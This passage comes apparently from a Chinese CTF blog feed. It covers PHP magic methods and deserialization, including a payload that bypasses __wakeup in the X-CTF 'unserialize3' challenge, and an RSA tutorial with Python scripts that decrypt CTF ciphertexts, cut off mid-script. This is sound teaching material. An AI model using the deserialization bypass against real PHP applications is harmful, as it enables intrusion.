title="魔术函数"></a>魔术函数</h2><p>PHP面向对象变成中，有一类函数叫做魔术函数。这些函数是以<code>__</code>开头的，依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>__wakeup()</td><td>触发unserialize()方法时会被调用</td></tr><tr><td>__sleep()</td><td>触发serialize()方法时会被调用</td></tr><tr><td>__construct()</td><td>创建一个对象时会被调用</td></tr><tr><td>__destruct()</td><td>销毁一个对象时会被调用</td></tr><tr><td>__get()</td><td>调出不可访问（private，protect等修饰）属性时会被调用。</td></tr><tr><td>__set()</td><td>修改或写入不可访问（private，protect等修饰）属性时会被调用。</td></tr><tr><td>__toString()</td><td>类对象被当作一个字符串使用时会被调用。</td></tr><tr><td>__isset()</td><td>对不可访问（private，protect等修饰）属性使用empty()或isset()方法时会被调用。</td></tr><tr><td>__unset（）</td><td>对不可访问（private，protect等修饰）属性使用unset()方法时会被调用。</td></tr><tr><td>__invoke()</td><td>将实例化对象当作方法使用时会被调用。</td></tr></tbody></table><h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="wakeup-和-sleep"><a href="#wakeup-和-sleep" class="headerlink" title="__wakeup()和__sleep()"></a>__wakeup()和__sleep()</h3><blockquote><p>   <strong>PHP __wakeup()函数漏洞</strong><br>   在程序执行前，serialize() 函数会首先检查是否存在一个魔术方法 __sleep。如果存在，__sleep()方法会先被调用， 然后才执行串行化（序列化）操作。<br>   这个功能可以用于清理对象，并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误。与之相反，unserialize()会检查是否存在一个__wakeup方法。<br>   如果存在，则会先调用__wakeup方法，预先准备对象数据。但是这个wakeup()是可以被绕过的__wakeup 触发于 unserilize() 调用之前, 当反序列化时的字符串所对应的对象的数目被修改,__wake 的函数就不会被调用. 并且不会重建为对象, 但是会触发其他的魔术方法比如__destruct。</p></blockquote><p>来一道题</p><p> <strong><em>[X-CTF]unserialize3</em></strong><br>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><p>打开题目，进行代码审计，可以看到xctf类只拥有一个public的flag变量，值为111。对xctf类进行序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化后的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>直接传参给code的结果<br><img src="https://img-blog.csdnimg.cn/20201014185510234.png#pic_center" alt="在这里插入图片描述"><br>我们要绕过<code>__wakeup</code>这个魔术函数，利用反序列化漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会绕过<code>__wakeup</code>的执行</p><p>将上面的序列化后字符串，对象属性个数由真实值1修改为2。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020101419075342.png#pic_center" alt="在这里插入图片描述"></p><h2 id="序列化参数"><a href="#序列化参数" class="headerlink" title="序列化参数"></a>序列化参数</h2><p>序列化参数有三种，分别是public、protected和private，三者在序列化时有明显的区别。</p><h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123231004661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>public序列化后的参数变成 <code>test1</code></p><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><blockquote><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test1</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123231030686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;\00test\00test2&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>private序列化后的参数被反序列化后变成 <code>\00test\00test2</code> </p><h3 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h3><blockquote><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test3</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123230813337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;\00*\00test3&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>protected序列化后的参数变成 <code>\00*\00test3</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：PHP反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="PHP" scheme="https://swhat.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>RSA算法详解与练习</title>
    <link href="https://swhat.github.io/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/"/>
    <id>https://swhat.github.io/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/</id>
    <published>2020-10-04T07:50:38.000Z</published>
    <updated>2021-02-05T04:28:08.191Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：做题遇到的一些RSA脚本</p><a id="more"></a><h2 id="1-什么是RSA"><a href="#1-什么是RSA" class="headerlink" title="1. 什么是RSA"></a>1. 什么是RSA</h2><p>1977年，麻省理工学院的 Ron Rivest、Adi Shamir 和 Leonard Adleman 共同提出了一种非对称加密算法，用他们三人的姓氏缩写命名为 RSA。RSA 既不是惟一，也不是最早的非对称加密算法。但它是使用最广泛，因而也是最重要的非对称加密算法。</p><h2 id="2-RSA算法描述"><a href="#2-RSA算法描述" class="headerlink" title="2. RSA算法描述"></a>2. RSA算法描述</h2><h3 id="2-1-产生公私密钥对"><a href="#2-1-产生公私密钥对" class="headerlink" title="2.1 产生公私密钥对"></a>2.1 产生公私密钥对</h3><blockquote><p>1.随机选择两个不相等的质数p和q。<br>2.计算p和q的乘积n(n=p*q),n的长度就是密钥长度。<br>3.计算n的欧拉函数φ(n)： φ(n) = (p-1)(q-1)<br>4.随机选择一个整数e，也就是公钥当中用来加密的那个数字 条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。<br>5.取e的模反数d，计算方法为:e * d ≡ 1 (mod φ)<br>6.将n和e封装成公钥，n和d封装成私钥，（n，e),(n，d)就是密钥对。</p></blockquote><p>补充说明:<br>1.下面代码中使用<code>phi</code>代替欧拉函数φ(n)<br>2.如果两个正整数e和n互质，那么一定可以找到整数d，使得 e * d - 1 被n整除，或者说e * d被n除的余数是1。这时，d就叫做e的“模反元素”。</p><h3 id="2-2-RSA加密"><a href="#2-2-RSA加密" class="headerlink" title="2.2 RSA加密"></a>2.2 RSA加密</h3><p> 首先对明文进行比特串分组，使得每个分组对应的十进制数小于n，然后依次对每个分组m做一次加密，所有分组的密文构成的序列就是原始消息的加密结果，即m满足0&lt;=m&lt;n，则加密算法为：<br> <code>c≡ m^e mod n</code>; c为密文，且0&lt;=c&lt;n。 （还可以表示为c = pow(m, e, N）<br> <img src="https://img-blog.csdnimg.cn/20201004174827178.png#pic_center" alt="在这里插入图片描述"></p><p>也就是说RSA加密是对明文的E次方后除以N后求余数的过程。只要知道E和N就可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说E和N的组合就是公钥。即<code>公钥=(E,N)</code></p><h3 id="2-3-RSA解密"><a href="#2-3-RSA解密" class="headerlink" title="2.3 RSA解密"></a>2.3 RSA解密</h3><p>对于密文0&lt;=c&lt;n，解密算法为： <code>m≡ c^d mod n</code>;（还可以表示为m = pow(c, d, N)）</p><p><img src="https://img-blog.csdnimg.cn/20201004113320969.png#pic_center" alt="在这里插入图片描述"><br>也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥。即<code>私钥=(D,N)</code></p><h3 id="2-4-RSA相关值"><a href="#2-4-RSA相关值" class="headerlink" title="2.4 RSA相关值"></a>2.4 RSA相关值</h3><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>p 和 q</td><td>两个不相等的质数</td></tr><tr><td>n</td><td>大整数n，称之为模数</td></tr><tr><td>e 和 d</td><td>互为模反数的两个指数</td></tr><tr><td>c 和 m</td><td>分别是密文和明文</td></tr></tbody></table><h2 id="3-安装gmpy2"><a href="#3-安装gmpy2" class="headerlink" title="3. 安装gmpy2"></a>3. 安装gmpy2</h2><p>检查一下是否安装了wheel文件包，在cmd中输入<code>wheel</code>，查看一下<br><img src="https://img-blog.csdnimg.cn/20201004171147495.png#pic_center" alt="在这里插入图片描述"><br>如果没有安装，则输入<code>pip install wheel</code>安装<br><img src="https://img-blog.csdnimg.cn/20201004171222132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>安装好wheel后，还需要再安装gmpy2所需要的whl文件，查找需要的<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">whl文件包</a>。注意，whl文件包需要和你所安装的python3版本一致；</p><p>输入python查看电脑Python版本所支持的whl文件版本<br><img src="https://img-blog.csdnimg.cn/2020100417135991.png#pic_center" alt="在这里插入图片描述"><br>我使用的是python3.8 32位，下载gmpy2‑2.0.8‑cp38‑cp38‑win32.whl，放到python文件目录下。<br><img src="https://img-blog.csdnimg.cn/20201004172026759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>然后再在cmd中输入：pip install （whl文件的路径）<br><img src="https://img-blog.csdnimg.cn/20201004172409410.png#pic_center" alt="在这里插入图片描述"><br>最后输入：<code>pip install gmpy2</code>就可以安装，没有报错即安装成功<br><img src="https://img-blog.csdnimg.cn/2020100417261163.png#pic_center" alt="在这里插入图片描述"></p><h2 id="4-实战练习"><a href="#4-实战练习" class="headerlink" title="4. 实战练习"></a>4. 实战练习</h2><h3 id="4-1-已知p、q、e，求d"><a href="#4-1-已知p、q、e，求d" class="headerlink" title="4.1 已知p、q、e，求d"></a>4.1 已知p、q、e，求d</h3><p><strong>[BUUCTF]RSA</strong><br><img src="https://img-blog.csdnimg.cn/20201005193350346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p>运行得到<br><img src="https://img-blog.csdnimg.cn/20201005193500626.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-2-1-已知p、q、e、密文c，求明文m"><a href="#4-2-1-已知p、q、e、密文c，求明文m" class="headerlink" title="4.2.1 已知p、q、e、密文c，求明文m"></a>4.2.1 已知p、q、e、密文c，求明文m</h3><p><strong>[BUUCTF] rsarsa</strong></p><p>打开文档，给出了p、q、e的值<br><img src="https://img-blog.csdnimg.cn/20200930105157902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><em>方法一</em>：使用RSAtool工具<br>使用rsatool工具计算d的值，直接填入p,q,把e =  65537转换为16进制在再填入，再点击Calc.D,即可获得D的值。<br><img src="https://img-blog.csdnimg.cn/20200930105901703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">C = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">d = <span class="number">56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span></span><br><span class="line">n = p*q</span><br><span class="line">flag = <span class="built_in">pow</span>(C,d,n)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到明文flag<br><img src="https://img-blog.csdnimg.cn/20200930110203438.png#pic_center" alt="在这里插入图片描述"><br><em>方法二</em>：利用<code>gmpy2</code>直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">C = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"><span class="comment">#1.求d</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment">#2.求n</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="comment">#3.m=pow(c,d,n)</span></span><br><span class="line">flag = <span class="built_in">pow</span>(C,d,n)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到明文flag<br><img src="https://img-blog.csdnimg.cn/20201004194955531.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-2-2-已知c、q、n、e，求明文m"><a href="#4-2-2-已知c、q、n、e，求明文m" class="headerlink" title="4.2.2 已知c、q、n、e，求明文m"></a>4.2.2 已知c、q、n、e，求明文m</h3><p><a href="https://www.cnblogs.com/shenshuoyaoyouguang/p/14025343.html">参考文章</a><br>给了 c, q, n ,e</p><p>求 p : n//q</p><p>求 d: d = invmod(e,(p-1)*(q-1))</p><p>求 flag : flag = pow(c,d,n)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149</span></span><br><span class="line">q = <span class="number">166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043</span></span><br><span class="line">c = <span class="number">177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">p = n//q</span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line">i = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(libnum.n2s(i))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201129000806367.png" alt="在这里插入图片描述"></p><h3 id="4-3-已知n、e、密文c，求明文m"><a href="#4-3-已知n、e、密文c，求明文m" class="headerlink" title="4.3 已知n、e、密文c，求明文m"></a>4.3 已知n、e、密文c，求明文m</h3><p><strong>[ctfshow]easyrsa1</strong><br><img src="https://img-blog.csdnimg.cn/20201004200123150.png#pic_center" alt="在这里插入图片描述"><br>分解质因数n<br><img src="https://img-blog.csdnimg.cn/202010042038209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">1455925529734358105461406532259911790807347616464991065301847</span></span><br><span class="line">c = <span class="number">69380371057914246192606760686152233225659503366319332065009</span></span><br><span class="line"><span class="comment">#1.将n分解为p和q</span></span><br><span class="line">p = <span class="number">1201147059438530786835365194567</span></span><br><span class="line">q = <span class="number">1212112637077862917192191913841</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>) </span><br><span class="line"><span class="comment">#2.求d</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment">#3.m=pow(c,d,n)</span></span><br><span class="line">m = gmpy2.powmod(c,d,n) </span><br><span class="line">print(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#binascii.unhexlify(hexstr):从十六进制字符串hexstr返回二进制数据</span></span><br></pre></td></tr></table></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/202010042008171.png#pic_center" alt="在这里插入图片描述"><br>注：<br>1.在线分解质因数：<a href="http://www.factordb.com/">http://www.factordb.com</a> </p><p>2.代码中涉及到了<a href="https://blog.csdn.net/xc_zhou/article/details/82079762">python之binascii模块</a>相关知识</p><h3 id="4-4-已知public-key、密文c，求明文m"><a href="#4-4-已知public-key、密文c，求明文m" class="headerlink" title="4.4 已知public key、密文c，求明文m"></a>4.4 已知public key、密文c，求明文m</h3><p> <strong>[BUUCTF]RSA</strong><br>下载附件<br><img src="https://img-blog.csdnimg.cn/20201011162231603.png#pic_center" alt="在这里插入图片描述"><br>用记事本打开pub.key<br><img src="https://img-blog.csdnimg.cn/20201011162321313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="http://tool.chacuo.net/cryptrsakeyparse">解析公钥</a><br><img src="https://img-blog.csdnimg.cn/20201011162453842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>模数和指数即为n和e，还需要把n从十六进制转换为十进制<br><img src="https://img-blog.csdnimg.cn/20201011162645687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="http://www.factordb.com/">分解n</a>，得到p和q</p><p><img src="https://img-blog.csdnimg.cn/20201011162813249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>接下来就是通过脚本求出明文m</p><p>脚本需要用到python的rsa库，在cmd中输入<code>pip install rsa</code>即可完成安装<br><img src="https://img-blog.csdnimg.cn/20201011163120354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"> </span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p=<span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q=<span class="number">304008741604601924494328155975272418463</span></span><br><span class="line"> </span><br><span class="line">phin = (p-<span class="number">1</span>) * 